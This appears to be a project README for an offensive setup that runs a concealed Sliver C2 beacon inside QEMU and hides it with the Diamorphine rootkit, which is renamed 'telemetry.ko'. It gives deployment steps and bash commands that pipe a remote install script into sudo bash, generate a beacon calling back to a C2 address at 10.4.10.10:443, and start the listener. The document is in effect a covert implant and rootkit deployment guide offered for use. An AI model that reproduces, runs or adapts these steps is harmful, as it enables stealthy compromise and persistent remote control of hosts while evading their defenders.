Linux environment setup script that builds u-root, runs a concealed Sliver C2 agent in QEMU, and hides the process using Diamorphine rootkit.

Tested on Ubuntu 16.04.7 LTS (Xenial Xerus) (GNU/Linux 4.4.0-186-generic x86_64).

- Add slivki (Sliver C2 beacon), telemetry.ko (Diamorphine rootkit) and deploy.sh script to a deploy.tar.gz archive and execute starter.sh on a host;
- Change IP address of your C2 server;
- Compile Sliver C2 beacon as following:

```bash
curl https://sliver.sh/install|sudo bash

sliver

generate beacon --mtls 10.4.10.10:443 --os linux --arch amd64 --format elf --save slivki

mtls --lport 443
```


Credits:

- https://github.com/m0nad/Diamorphine
- https://github.com/u-root/u-root
- https://github.com/qemu/qemu

---

